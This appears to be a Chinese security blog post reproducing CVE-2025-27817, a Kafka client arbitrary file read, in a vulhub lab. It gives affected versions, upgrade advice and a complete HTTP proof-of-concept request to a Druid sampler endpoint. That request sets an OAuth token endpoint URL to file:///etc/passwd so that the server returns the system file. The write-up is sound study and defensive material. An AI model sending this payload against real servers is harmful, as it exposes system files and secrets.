> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI4MjkxNzY1NQ==&mid=2247485966&idx=1&sn=502623af4e680d22ab43973a413eee69

#  【漏洞复现】Kafka Connect任意文件读取漏洞（CVE-2025-27817)  
徐志洋  玄武盾网络技术实验室   2025-06-20 15:29  
  
##     “ 对我们感兴趣的话就点个关注吧！”  
  
## 免责声明：本文仅供安全研究与学习之用，严禁用于非法用途，违者后果自负。  
##   
## 漏洞介绍  
  
Apache Kafka 是一个开源分布式事件流平台，被数千家公司用于高性能数据管道、流分析、数据集成和任务关键型应用程序。Apache Kafka 客户端接受用于设置与代理的 SASL/OAUTHBEARER 连接的配置数据，包括“sasl.oauthbearer.token.endpoint.url”和“sasl.oauthbearer.jwks.endpoint.url”。Apache Kafka 允许客户端读取任意文件并返回错误日志中的内容，或将请求发送到意外位置。在 Apache Kafka 客户端配置可由不受信任的一方指定的应用程序中，攻击者可能会使用“sasl.oauthbearer.token.endpoint.url”和“sasl.oauthbearer.jwks.endpoint.url”配置来读取磁盘和环境变量的任意内容或向意外位置发出请求。  
## 影响范围  
  
3.1.0 ≤ Apache Kafka < 3.9.1  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Ej4eNleprJLj6msOWBPWQgs5gPtxcbRwicK7VYD0yPDkCCWMqibo21wQsiamAIQP4dwYXavDQEwmFZDX0zNSqEm3w/640?wx_fmt=jpeg "")  
  
环境搭建，使用vulhub的之前漏洞环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJLj6msOWBPWQgs5gPtxcbRw2sf0vd4WeicbyPEuZ5HEUFwpD0B0wydeQfeIDNiahw7t6uF025z7AJibA/640?wx_fmt=png "")  
  

```
https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194
```

  
  
poc测试  

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: 192.168.168.130:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1752
{
    &#34;type&#34;:&#34;kafka&#34;,
    &#34;spec&#34;:{
        &#34;type&#34;:&#34;kafka&#34;,
        &#34;ioConfig&#34;:{
            &#34;type&#34;:&#34;kafka&#34;,
            &#34;consumerProperties&#34;:{&#34;bootstrap.servers&#34;: &#34;127.0.0.1:6666&#34;,&#34;sasl.mechanism&#34;: &#34;OAUTHBEARER&#34;,&#34;security.protocol&#34;: &#34;SASL_SSL&#34;,&#34;sasl.login.callback.handler.class&#34;: &#34;org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler&#34;,&#34;sasl.oauthbearer.token.endpoint.url&#34;:&#34;file:///etc/passwd&#34;,&#34;sasl.jaas.config&#34;: &#34;org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required sasl.oauthbearer.token.endpoint.url=\&#34;http://127.0.0.1/token\&#34; sasl.oauthbearer.jwks.endpoint.url=\&#34;http://127.0.0.1/jwks\&#34; sasl.oauthbearer.client.id=your-client-id sasl.oauthbearer.client.secret=your-client-secret sasl.oauthbearer.expected.audience=kafka sasl.oauthbearer.expected.issuer=\&#34;http://127.0.0.1\&#34; useFirstPass=true serviceName=kafka debug=true;&#34;},
            &#34;topic&#34;:&#34;test&#34;,
            &#34;useEarliestOffset&#34;:true,
            &#34;inputFormat&#34;:{
                &#34;type&#34;:&#34;regex&#34;,
                &#34;pattern&#34;:&#34;([\\s\\S]*)&#34;,
                &#34;listDelimiter&#34;:&#34;56616469-6de2-9da4-efb8-8f416e6e6965&#34;,
                &#34;columns&#34;:[
                    &#34;raw&#34;
                ]
            }
        },
        &#34;dataSchema&#34;:{
            &#34;dataSource&#34;:&#34;sample&#34;,
            &#34;timestampSpec&#34;:{
                &#34;column&#34;:&#34;!!!_no_such_column_!!!&#34;,
                &#34;missingValue&#34;:&#34;1970-01-01T00:00:00Z&#34;
            },
            &#34;dimensionsSpec&#34;:{
            },
            &#34;granularitySpec&#34;:{
                &#34;rollup&#34;:false
            }
        },
        &#34;tuningConfig&#34;:{
            &#34;type&#34;:&#34;kafka&#34;
        }
    },
    &#34;samplerConfig&#34;:{
        &#34;numRows&#34;:500,
        &#34;timeoutMs&#34;:15000
    }
}
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJLj6msOWBPWQgs5gPtxcbRwcCoW8te3XzRuWU8JNKvLiakic23kB6j47ACpqXNYGODiaEoo3PEmOGFHg/640?wx_fmt=png "")  
## 修复意见  
  
官方已发布最新版本修复该漏洞，建议受影响用户将Apache Kafka更新到3.9.1及以上版本。  
  
下载链接：  
  
https://github.com/apache/kafka/tags   
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0knIjq7rj7rsX0r4Rf2CDQylx0IjMfpPM93icE9AGx28bqwDRau5EkcWpK6WBAG5zGDS41wkfcvJiaA/640?wx_fmt=png "")  
  
声明：  
技术文章均收集于互联网，仅作为本人学习、记录使用。  
侵权删  
！  
！  
！  
  
  
  
  
  
  
  
